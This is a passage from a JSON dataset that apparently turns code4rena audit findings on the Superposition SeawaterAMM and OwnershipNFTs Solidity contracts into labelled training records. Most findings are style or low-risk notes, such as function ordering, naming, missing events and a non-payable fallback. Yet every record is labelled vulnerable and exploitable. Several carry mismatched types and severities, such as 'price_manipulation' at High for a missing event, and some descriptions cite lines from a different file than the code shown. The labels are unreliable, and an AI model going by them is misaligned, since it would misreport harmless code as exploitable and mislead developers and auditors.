    "code": "solidity\nFile: ./pkg/sol/SeawaterAMM.sol\n\n487:         if (uint8(msg.data[2]) == EXECUTOR_SWAP_DISPATCH)\n\n490:         else if (uint8(msg.data[2]) == EXECUTOR_UPDATE_POSITION_DISPATCH)\n\n493:         else if (uint8(msg.data[2]) == EXECUTOR_POSITION_DISPATCH)\n\n496:         else if (uint8(msg.data[2]) == EXECUTOR_ADMIN_DISPATCH)\n\n499:         else if (uint8(msg.data[2]) == EXECUTOR_SWAP_PERMIT2_A_DISPATCH)\n\n502:         else if (uint8(msg.data[2]) == EXECUTOR_QUOTES_DISPATCH) directDelegate(_getExecutorQuote());\n\n503:         else if (uint8(msg.data[2]) == EXECUTOR_ADJUST_POSITION_DISPATCH) directDelegate(_getExecutorAdjustPosition());\n\n504:         else if (uint8(msg.data[2]) == EXECUTOR_SWAP_PERMIT2_B_DISPATCH) directDelegate(_getExecutorSwapPermit2B());\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "<a name=\"NC-3\"></a>[NC-3] Control structures do not follow the Solidity Style Guide",
    "description": "See the [control structures](https://docs.soliditylang.org/en/latest/style-guide.html#control-structures) section of the Solidity Style Guide *Instances (9)*: File: ./pkg/sol/OwnershipNFTs.sol 74:         if (_to.code.length == 0) return; [Link to code](https://github.com/code-423n4/2024-10-superposition/blob/main/./pkg/sol/OwnershipNFTs.sol)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-10-superposition",
    "audit_source": "code4rena",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.765,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: ./pkg/sol/OwnershipNFTs.sol\n\n138:     function setApprovalForAll(address _operator, bool _approved) external {\n             isApprovedForAll[msg.sender][_operator] = _approved;\n             emit ApprovalForAll(msg.sender, _operator, _approved);\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "High",
    "title": "<a name=\"NC-6\"></a>[NC-6] Events that mark critical parameter changes should contain both the old and the new value",
    "description": "This should especially be done if the new value is not required to be different from the old value *Instances (1)*: File: ./pkg/sol/OwnershipNFTs.sol 138:     function setApprovalForAll(address _operator, bool _approved) external { isApprovedForAll[msg.sender][_operator] = _approved;",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2024-10-superposition",
    "audit_source": "code4rena",
    "lines_of_code": 8,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.261,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: ./pkg/sol/SeawaterAMM.sol\n\n1: \n   Current order:\n   internal getAddressSlot\n   public updateProxyAdmin\n   internal directDelegate\n   external createPoolD650E2D0\n   external collectProtocol7540FA9F\n   external enablePool579DA658\n   external authoriseEnabler5B17C274\n   external setSqrtPriceFF4DB98C\n   external updateNftManager9BDF41F6\n   external updateEmergencyCouncil7D0C1C58\n   external swap904369BE\n   external quote72E2ADE7\n   external quote2CD06B86E\n   external swapPermit2EE84AD91\n   external swap2ExactInPermit254A7DBB1\n   external swap2ExactIn41203F1D\n   external swapIn32502CA71\n   external swapInPermit2CEAAB576\n   external swapOut5E08A399\n   external swapOutPermit23273373B\n   external mintPositionBC5B086D\n   external positionOwnerD7878480\n   external transferPositionEEC7A3CD\n   external positionBalance4F32C7DB\n   external positionLiquidity8D11C045\n   external positionTickLower2F77CCE1\n   external positionTickUpper67FD55BA\n   external sqrtPriceX967B8F5FC5\n   external feesOwed22F28DBD\n   external curTick181C6FD9\n   external tickSpacing653FE28F\n   external feeBB3CF608\n   external feeGrowthGlobal038B5665B\n   external feeGrowthGlobal1A33A5A1B\n   external collectSingleTo6D76575F\n   external collect7F21947C\n   external updatePositionC7F1F740\n   external incrPositionE2437399\n   external setExecutorSwap\n   external setExecutorSwapPermit2A\n   external setExecutorQuote\n   external setExecutorPosition\n   external setExecutorUpdatePosition\n   external setExecutorAdmin\n   external setExecutorAdjustPosition\n   external setExecutorSwapPermit2B\n   external setExecutorFallback\n   internal _getExecutorSwap\n   internal _getExecutorSwapPermit2A\n   internal _getExecutorQuote\n   internal _getExecutorPosition\n   internal _getExecutorUpdatePosition\n   internal _getExecutorAdmin\n   internal _getExecutorAdjustPosition\n   internal _getExecutorSwapPermit2B\n   internal _getExecutorFallback\n   internal _setProxyAdmin\n   internal _setProxies\n   \n   Suggested order:\n   external createPoolD650E2D0\n   external collectProtocol7540FA9F\n   external enablePool579DA658\n   external authoriseEnabler5B17C274\n   external setSqrtPriceFF4DB98C\n   external updateNftManager9BDF41F6\n   external updateEmergencyCouncil7D0C1C58\n   external swap904369BE\n   external quote72E2ADE7\n   external quote2CD06B86E\n   external swapPermit2EE84AD91\n   external swap2ExactInPermit254A7DBB1\n   external swap2ExactIn41203F1D\n   external swapIn32502CA71\n   external swapInPermit2CEAAB576\n   external swapOut5E08A399\n   external swapOutPermit23273373B\n   external mintPositionBC5B086D\n   external positionOwnerD7878480\n   external transferPositionEEC7A3CD\n   external positionBalance4F32C7DB\n   external positionLiquidity8D11C045\n   external positionTickLower2F77CCE1\n   external positionTickUpper67FD55BA\n   external sqrtPriceX967B8F5FC5\n   external feesOwed22F28DBD\n   external curTick181C6FD9\n   external tickSpacing653FE28F\n   external feeBB3CF608\n   external feeGrowthGlobal038B5665B\n   external feeGrowthGlobal1A33A5A1B\n   external collectSingleTo6D76575F\n   external collect7F21947C\n   external updatePositionC7F1F740\n   external incrPositionE2437399\n   external setExecutorSwap\n   external setExecutorSwapPermit2A\n   external setExecutorQuote\n   external setExecutorPosition\n   external setExecutorUpdatePosition\n   external setExecutorAdmin\n   external setExecutorAdjustPosition\n   external setExecutorSwapPermit2B\n   external setExecutorFallback\n   public updateProxyAdmin\n   internal getAddressSlot\n   internal directDelegate\n   internal _getExecutorSwap\n   internal _getExecutorSwapPermit2A\n   internal _getExecutorQuote\n   internal _getExecutorPosition\n   internal _getExecutorUpdatePosition\n   internal _getExecutorAdmin\n   internal _getExecutorAdjustPosition\n   internal _getExecutorSwapPermit2B\n   internal _getExecutorFallback\n   internal _setProxyAdmin\n   internal _setProxies\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "<a name=\"NC-7\"></a>[NC-7] Function ordering does not follow the Solidity style guide",
    "description": "According to the [Solidity style guide](https://docs.soliditylang.org/en/v0.8.17/style-guide.html#order-of-functions), functions should be laid out in the following order :`constructor()`, `receive()`, `fallback()`, `external`, `public`, `internal`, `private`, but the cases below do not follow this pattern *Instances (2)*: File: ./pkg/sol/OwnershipNFTs.sol 1: Current order:",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-10-superposition",
    "audit_source": "code4rena",
    "lines_of_code": 125,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: ./pkg/sol/SeawaterAMM.sol\n\n59:     function getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) {\n\n123:     function updateProxyAdmin(address newAdmin) public onlyProxyAdmin {\n\n181:     function enablePool579DA658(address /* pool */, bool /* enabled */) external {\n\n186:     function authoriseEnabler5B17C274(address /* enabler */, bool /* enabled */) external {\n\n191:     function setSqrtPriceFF4DB98C(address /* pool */, uint256 /* price */) external {\n\n196:     function updateNftManager9BDF41F6(address /* manager */) external {\n\n201:     function updateEmergencyCouncil7D0C1C58(address /* council */) external {\n\n228:     function quote2CD06B86E(address /* from */, address /* to */, uint256 /* amount */, uint256 /* minOut*/) external {\n\n270:     function swapIn32502CA71(address token, uint256 amountIn, uint256 minOut) external returns (int256, int256) {\n\n307:     function swapOut5E08A399(address token, uint256 amountIn, uint256 minOut) external returns (int256, int256) {\n\n353:     function positionOwnerD7878480(uint256 /* id */) external returns (address) {\n\n359:     function transferPositionEEC7A3CD(uint256 /* id */, address /* from */, address /* to */) external {\n\n364:     function positionBalance4F32C7DB(address /* user */) external returns (uint256) {\n\n369:     function positionLiquidity8D11C045(address /* pool */, uint256 /* id */) external returns (uint128) {\n\n374:     function positionTickLower2F77CCE1(address /* pool */, uint256 /* id */) external returns (int32) {\n\n379:     function positionTickUpper67FD55BA(address /* pool */, uint256 /* id */) external returns (int32) {\n\n384:     function sqrtPriceX967B8F5FC5(address /* pool */) external returns (uint256) {\n\n389:     function feesOwed22F28DBD(address /* pool */, uint256 /* position */) external returns (uint128, uint128) {\n\n394:     function curTick181C6FD9(address /* pool */) external returns (int32) {\n\n399:     function tickSpacing653FE28F(address /* pool */) external returns (uint8) {\n\n404:     function feeBB3CF608(address /* pool */) external returns (uint32) {\n\n409:     function feeGrowthGlobal038B5665B(address /* pool */) external returns (uint256) {\n\n414:     function feeGrowthGlobal1A33A5A1B(address /*pool */) external returns (uint256) {\n\n456:     function setExecutorSwap(address a) external onlyProxyAdmin {\n\n459:     function setExecutorSwapPermit2A(address a) external onlyProxyAdmin {\n\n462:     function setExecutorQuote(address a) external onlyProxyAdmin {\n\n465:     function setExecutorPosition(address a) external onlyProxyAdmin {\n\n468:     function setExecutorUpdatePosition(address a) external onlyProxyAdmin {\n\n471:     function setExecutorAdmin(address a) external onlyProxyAdmin {\n\n474:     function setExecutorAdjustPosition(address a) external onlyProxyAdmin {\n\n477:     function setExecutorSwapPermit2B(address a) external onlyProxyAdmin {\n\n480:     function setExecutorFallback(address a) external onlyProxyAdmin {\n\n512:     function _getExecutorSwap() internal view returns (address) {\n\n515:     function _getExecutorSwapPermit2A() internal view returns (address) {\n\n518:     function _getExecutorQuote() internal view returns (address) {\n\n521:     function _getExecutorPosition() internal view returns (address) {\n\n524:     function _getExecutorUpdatePosition() internal view returns (address) {\n\n527:     function _getExecutorAdmin() internal view returns (address) {\n\n530:     function _getExecutorAdjustPosition() internal view returns (address) {\n\n533:     function _getExecutorSwapPermit2B() internal view returns (address) {\n\n536:     function _getExecutorFallback() internal view returns (address) {\n\n540:     function _setProxyAdmin(address newAdmin) internal {\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "<a name=\"NC-8\"></a>[NC-8] Functions should not be longer than 50 lines",
    "description": "Overly complex code can make understanding functionality more difficult, try to further modularize your code to ensure readability *Instances (54)*: File: ./pkg/sol/OwnershipNFTs.sol 47:     function ownerOf(uint256 _tokenId) public view returns (address) { 57:     function getApproved(uint256 _tokenId) external view returns (address) {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-10-superposition",
    "audit_source": "code4rena",
    "lines_of_code": 88,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: ./pkg/sol/SeawaterAMM.sol\n\n123:     function updateProxyAdmin(address newAdmin) public onlyProxyAdmin {\n             _setProxyAdmin(newAdmin);\n\n123:     function updateProxyAdmin(address newAdmin) public onlyProxyAdmin {\n             _setProxyAdmin(newAdmin);\n\n191:     function setSqrtPriceFF4DB98C(address /* pool */, uint256 /* price */) external {\n             directDelegate(_getExecutorAdmin());\n\n191:     function setSqrtPriceFF4DB98C(address /* pool */, uint256 /* price */) external {\n             directDelegate(_getExecutorAdmin());\n\n196:     function updateNftManager9BDF41F6(address /* manager */) external {\n             directDelegate(_getExecutorAdmin());\n\n196:     function updateNftManager9BDF41F6(address /* manager */) external {\n             directDelegate(_getExecutorAdmin());\n\n201:     function updateEmergencyCouncil7D0C1C58(address /* council */) external {\n             directDelegate(_getExecutorAdmin());\n\n201:     function updateEmergencyCouncil7D0C1C58(address /* council */) external {\n             directDelegate(_getExecutorAdmin());\n\n436:     function updatePositionC7F1F740(\n             address /* pool */,\n             uint256 /* id */,\n             int128 /* delta */\n         ) external returns (int256, int256) {\n             directDelegate(_getExecutorUpdatePosition());\n\n436:     function updatePositionC7F1F740(\n             address /* pool */,\n             uint256 /* id */,\n             int128 /* delta */\n         ) external returns (int256, int256) {\n             directDelegate(_getExecutorUpdatePosition());\n\n456:     function setExecutorSwap(address a) external onlyProxyAdmin {\n             StorageSlot.getAddressSlot(EXECUTOR_SWAP_SLOT).value = a;\n\n456:     function setExecutorSwap(address a) external onlyProxyAdmin {\n             StorageSlot.getAddressSlot(EXECUTOR_SWAP_SLOT).value = a;\n\n459:     function setExecutorSwapPermit2A(address a) external onlyProxyAdmin {\n             StorageSlot.getAddressSlot(EXECUTOR_SWAP_PERMIT2_A_SLOT).value = a;\n\n459:     function setExecutorSwapPermit2A(address a) external onlyProxyAdmin {\n             StorageSlot.getAddressSlot(EXECUTOR_SWAP_PERMIT2_A_SLOT).value = a;\n\n462:     function setExecutorQuote(address a) external onlyProxyAdmin {\n             StorageSlot.getAddressSlot(EXECUTOR_QUOTE_SLOT).value = a;\n\n462:     function setExecutorQuote(address a) external onlyProxyAdmin {\n             StorageSlot.getAddressSlot(EXECUTOR_QUOTE_SLOT).value = a;\n\n465:     function setExecutorPosition(address a) external onlyProxyAdmin {\n             StorageSlot.getAddressSlot(EXECUTOR_POSITION_SLOT).value = a;\n\n465:     function setExecutorPosition(address a) external onlyProxyAdmin {\n             StorageSlot.getAddressSlot(EXECUTOR_POSITION_SLOT).value = a;\n\n468:     function setExecutorUpdatePosition(address a) external onlyProxyAdmin {\n             StorageSlot.getAddressSlot(EXECUTOR_UPDATE_POSITION_SLOT).value = a;\n\n468:     function setExecutorUpdatePosition(address a) external onlyProxyAdmin {\n             StorageSlot.getAddressSlot(EXECUTOR_UPDATE_POSITION_SLOT).value = a;\n\n471:     function setExecutorAdmin(address a) external onlyProxyAdmin {\n             StorageSlot.getAddressSlot(EXECUTOR_ADMIN_SLOT).value = a;\n\n471:     function setExecutorAdmin(address a) external onlyProxyAdmin {\n             StorageSlot.getAddressSlot(EXECUTOR_ADMIN_SLOT).value = a;\n\n474:     function setExecutorAdjustPosition(address a) external onlyProxyAdmin {\n             StorageSlot.getAddressSlot(EXECUTOR_ADJUST_POSITION_SLOT).value = a;\n\n474:     function setExecutorAdjustPosition(address a) external onlyProxyAdmin {\n             StorageSlot.getAddressSlot(EXECUTOR_ADJUST_POSITION_SLOT).value = a;\n\n477:     function setExecutorSwapPermit2B(address a) external onlyProxyAdmin {\n             StorageSlot.getAddressSlot(EXECUTOR_SWAP_PERMIT2_B_SLOT).value = a;\n\n477:     function setExecutorSwapPermit2B(address a) external onlyProxyAdmin {\n             StorageSlot.getAddressSlot(EXECUTOR_SWAP_PERMIT2_B_SLOT).value = a;\n\n480:     function setExecutorFallback(address a) external onlyProxyAdmin {\n             StorageSlot.getAddressSlot(EXECUTOR_FALLBACK_SLOT).value = a;\n\n480:     function setExecutorFallback(address a) external onlyProxyAdmin {\n             StorageSlot.getAddressSlot(EXECUTOR_FALLBACK_SLOT).value = a;\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "price_manipulation",
    "severity": "High",
    "title": "<a name=\"NC-10\"></a>[NC-10] Missing Event for critical parameters change",
    "description": "Events help non-contract tools to track changes, and events prevent users from being surprised by changes. *Instances (28)*: File: ./pkg/sol/SeawaterAMM.sol 123:     function updateProxyAdmin(address newAdmin) public onlyProxyAdmin { _setProxyAdmin(newAdmin);",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2024-10-superposition",
    "audit_source": "code4rena",
    "lines_of_code": 96,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      1,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: ./pkg/sol/SeawaterAMM.sol\n\n149:                 revert(0, returndatasize())\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "<a name=\"NC-14\"></a>[NC-14] Take advantage of Custom Error's return value property",
    "description": "An important feature of Custom Error is that values such as address, tokenID, msg.value can be written inside the () sign, this kind of approach provides a serious advantage in debugging and examining the revert details of dapps such as tenderly. *Instances (1)*: File: ./pkg/sol/SeawaterAMM.sol 149:                 revert(0, returndatasize()) [Link to code](https://github.com/code-423n4/2024-10-superposition/blob/main/./pkg/sol/SeawaterAMM.sol)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-10-superposition",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.092,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: ./pkg/sol/SeawaterAMM.sol\n\n1: \n   Current order:\n   StructDefinition.AddressSlot\n   FunctionDefinition.getAddressSlot\n   ModifierDefinition.onlyProxyAdmin\n   FunctionDefinition.constructor\n   FunctionDefinition.updateProxyAdmin\n   FunctionDefinition.directDelegate\n   FunctionDefinition.createPoolD650E2D0\n   FunctionDefinition.collectProtocol7540FA9F\n   FunctionDefinition.enablePool579DA658\n   FunctionDefinition.authoriseEnabler5B17C274\n   FunctionDefinition.setSqrtPriceFF4DB98C\n   FunctionDefinition.updateNftManager9BDF41F6\n   FunctionDefinition.updateEmergencyCouncil7D0C1C58\n   FunctionDefinition.swap904369BE\n   FunctionDefinition.quote72E2ADE7\n   FunctionDefinition.quote2CD06B86E\n   FunctionDefinition.swapPermit2EE84AD91\n   FunctionDefinition.swap2ExactInPermit254A7DBB1\n   FunctionDefinition.swap2ExactIn41203F1D\n   FunctionDefinition.swapIn32502CA71\n   FunctionDefinition.swapInPermit2CEAAB576\n   FunctionDefinition.swapOut5E08A399\n   FunctionDefinition.swapOutPermit23273373B\n   FunctionDefinition.mintPositionBC5B086D\n   FunctionDefinition.positionOwnerD7878480\n   FunctionDefinition.transferPositionEEC7A3CD\n   FunctionDefinition.positionBalance4F32C7DB\n   FunctionDefinition.positionLiquidity8D11C045\n   FunctionDefinition.positionTickLower2F77CCE1\n   FunctionDefinition.positionTickUpper67FD55BA\n   FunctionDefinition.sqrtPriceX967B8F5FC5\n   FunctionDefinition.feesOwed22F28DBD\n   FunctionDefinition.curTick181C6FD9\n   FunctionDefinition.tickSpacing653FE28F\n   FunctionDefinition.feeBB3CF608\n   FunctionDefinition.feeGrowthGlobal038B5665B\n   FunctionDefinition.feeGrowthGlobal1A33A5A1B\n   FunctionDefinition.collectSingleTo6D76575F\n   FunctionDefinition.collect7F21947C\n   FunctionDefinition.updatePositionC7F1F740\n   FunctionDefinition.incrPositionE2437399\n   FunctionDefinition.setExecutorSwap\n   FunctionDefinition.setExecutorSwapPermit2A\n   FunctionDefinition.setExecutorQuote\n   FunctionDefinition.setExecutorPosition\n   FunctionDefinition.setExecutorUpdatePosition\n   FunctionDefinition.setExecutorAdmin\n   FunctionDefinition.setExecutorAdjustPosition\n   FunctionDefinition.setExecutorSwapPermit2B\n   FunctionDefinition.setExecutorFallback\n   FunctionDefinition.fallback\n   FunctionDefinition._getExecutorSwap\n   FunctionDefinition._getExecutorSwapPermit2A\n   FunctionDefinition._getExecutorQuote\n   FunctionDefinition._getExecutorPosition\n   FunctionDefinition._getExecutorUpdatePosition\n   FunctionDefinition._getExecutorAdmin\n   FunctionDefinition._getExecutorAdjustPosition\n   FunctionDefinition._getExecutorSwapPermit2B\n   FunctionDefinition._getExecutorFallback\n   FunctionDefinition._setProxyAdmin\n   FunctionDefinition._setProxies\n   \n   Suggested order:\n   StructDefinition.AddressSlot\n   ModifierDefinition.onlyProxyAdmin\n   FunctionDefinition.getAddressSlot\n   FunctionDefinition.constructor\n   FunctionDefinition.updateProxyAdmin\n   FunctionDefinition.directDelegate\n   FunctionDefinition.createPoolD650E2D0\n   FunctionDefinition.collectProtocol7540FA9F\n   FunctionDefinition.enablePool579DA658\n   FunctionDefinition.authoriseEnabler5B17C274\n   FunctionDefinition.setSqrtPriceFF4DB98C\n   FunctionDefinition.updateNftManager9BDF41F6\n   FunctionDefinition.updateEmergencyCouncil7D0C1C58\n   FunctionDefinition.swap904369BE\n   FunctionDefinition.quote72E2ADE7\n   FunctionDefinition.quote2CD06B86E\n   FunctionDefinition.swapPermit2EE84AD91\n   FunctionDefinition.swap2ExactInPermit254A7DBB1\n   FunctionDefinition.swap2ExactIn41203F1D\n   FunctionDefinition.swapIn32502CA71\n   FunctionDefinition.swapInPermit2CEAAB576\n   FunctionDefinition.swapOut5E08A399\n   FunctionDefinition.swapOutPermit23273373B\n   FunctionDefinition.mintPositionBC5B086D\n   FunctionDefinition.positionOwnerD7878480\n   FunctionDefinition.transferPositionEEC7A3CD\n   FunctionDefinition.positionBalance4F32C7DB\n   FunctionDefinition.positionLiquidity8D11C045\n   FunctionDefinition.positionTickLower2F77CCE1\n   FunctionDefinition.positionTickUpper67FD55BA\n   FunctionDefinition.sqrtPriceX967B8F5FC5\n   FunctionDefinition.feesOwed22F28DBD\n   FunctionDefinition.curTick181C6FD9\n   FunctionDefinition.tickSpacing653FE28F\n   FunctionDefinition.feeBB3CF608\n   FunctionDefinition.feeGrowthGlobal038B5665B\n   FunctionDefinition.feeGrowthGlobal1A33A5A1B\n   FunctionDefinition.collectSingleTo6D76575F\n   FunctionDefinition.collect7F21947C\n   FunctionDefinition.updatePositionC7F1F740\n   FunctionDefinition.incrPositionE2437399\n   FunctionDefinition.setExecutorSwap\n   FunctionDefinition.setExecutorSwapPermit2A\n   FunctionDefinition.setExecutorQuote\n   FunctionDefinition.setExecutorPosition\n   FunctionDefinition.setExecutorUpdatePosition\n   FunctionDefinition.setExecutorAdmin\n   FunctionDefinition.setExecutorAdjustPosition\n   FunctionDefinition.setExecutorSwapPermit2B\n   FunctionDefinition.setExecutorFallback\n   FunctionDefinition.fallback\n   FunctionDefinition._getExecutorSwap\n   FunctionDefinition._getExecutorSwapPermit2A\n   FunctionDefinition._getExecutorQuote\n   FunctionDefinition._getExecutorPosition\n   FunctionDefinition._getExecutorUpdatePosition\n   FunctionDefinition._getExecutorAdmin\n   FunctionDefinition._getExecutorAdjustPosition\n   FunctionDefinition._getExecutorSwapPermit2B\n   FunctionDefinition._getExecutorFallback\n   FunctionDefinition._setProxyAdmin\n   FunctionDefinition._setProxies\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "Low",
    "title": "<a name=\"NC-15\"></a>[NC-15] Contract does not follow the Solidity style guide's suggested layout ordering",
    "description": "The [style guide](https://docs.soliditylang.org/en/v0.8.16/style-guide.html#order-of-layout) says that, within a contract, the ordering should be: 1) Type declarations 2) State variables 3) Events 4) Modifiers",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-10-superposition",
    "audit_source": "code4rena",
    "lines_of_code": 133,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: ./pkg/sol/SeawaterAMM.sol\n\n59:     function getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) {\n\n132:     function directDelegate(address to) internal {\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "<a name=\"NC-16\"></a>[NC-16] Internal and private variables and functions names should begin with an underscore",
    "description": "According to the Solidity Style Guide, Non-`external` variable and function names should begin with an [underscore](https://docs.soliditylang.org/en/latest/style-guide.html#underscore-prefix-for-non-external-functions-and-variables) *Instances (3)*: File: ./pkg/sol/OwnershipNFTs.sol 34:     mapping(uint256 => address) private getApproved_; [Link to code](https://github.com/code-423n4/2024-10-superposition/blob/main/./pkg/sol/OwnershipNFTs.sol)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-10-superposition",
    "audit_source": "code4rena",
    "lines_of_code": 8,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.194,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: ./pkg/sol/SeawaterAMM.sol\n\n36: bytes32 constant EXECUTOR_FALLBACK_SLOT = bytes32(uint256(keccak256(\"seawater.impl.fallback\")) - 1);\n\n97:         ISeawaterExecutorFallback _executorFallback\n\n109:             _executorFallback\n\n480:     function setExecutorFallback(address a) external onlyProxyAdmin {\n\n481:         StorageSlot.getAddressSlot(EXECUTOR_FALLBACK_SLOT).value = a;\n\n485:     fallback() external {\n\n505:         else directDelegate(_getExecutorFallback());\n\n536:     function _getExecutorFallback() internal view returns (address) {\n\n537:         return StorageSlot.getAddressSlot(EXECUTOR_FALLBACK_SLOT).value;\n\n553:         ISeawaterExecutorFallback executorFallback\n\n563:         StorageSlot.getAddressSlot(EXECUTOR_FALLBACK_SLOT).value = address(executorFallback);\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "<a name=\"L-1\"></a>[L-1] Fallback lacking `payable`",
    "description": "*Instances (11)*: File: ./pkg/sol/SeawaterAMM.sol 36: bytes32 constant EXECUTOR_FALLBACK_SLOT = bytes32(uint256(keccak256(\"seawater.impl.fallback\")) - 1); 97:         ISeawaterExecutorFallback _executorFallback 109:             _executorFallback",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-10-superposition",
    "audit_source": "code4rena",
    "lines_of_code": 26,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.796,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: ./pkg/sol/OwnershipNFTs.sol\n\n155:     function tokenURI(uint256 /* _tokenId */) external view returns (string memory) {\n             return TOKEN_URI;\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "<a name=\"L-2\"></a>[L-2] NFT ownership doesn't support hard forks",
    "description": "To ensure clarity regarding the ownership of the NFT on a specific chain, it is recommended to add `require(block.chainid == 1, \"Invalid Chain\")` or the desired chain ID in the functions below. Alternatively, consider including the chain ID in the URI itself. By doing so, any confusion regarding the chain responsible for owning the NFT will be eliminated. *Instances (1)*: File: ./pkg/sol/OwnershipNFTs.sol 155:     function tokenURI(uint256 /* _tokenId */) external view returns (string memory) {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-10-superposition",
    "audit_source": "code4rena",
    "lines_of_code": 7,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.167,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\n[Link to code](https://github.com/code-423n4/2024-10-superposition/blob/main/./pkg/sol/OwnershipNFTs.sol)\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "<a name=\"L-3\"></a>[L-3] Solidity version 0.8.20+ may not work on other chains due to `PUSH0`",
    "description": "The compiler for Solidity 0.8.20 switches the default target EVM version to [Shanghai](https://blog.soliditylang.org/2023/05/10/solidity-0.8.20-release-announcement/#important-note), which includes the new `PUSH0` op code. This op code may not yet be implemented on all L2s, so deployment on these chains will fail. To work around this issue, use an earlier [EVM](https://docs.soliditylang.org/en/v0.8.20/using-the-compiler.html?ref=zaryabs.com#setting-the-evm-version-to-target) [version](https://book.getfoundry.sh/reference/config/solidity-compiler#evm_version). While the project itself may or may not compile with 0.8.20, other projects with which it integrates, or which extend this project may, and those projects will have problems deploying these contracts/libraries. *Instances (2)*: File: ./pkg/sol/OwnershipNFTs.sol 2: pragma solidity 0.8.16; [Link to code](https://github.com/code-423n4/2024-10-superposition/blob/main/./pkg/sol/OwnershipNFTs.sol)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-10-superposition",
    "audit_source": "code4rena",
    "lines_of_code": 4,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.108,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
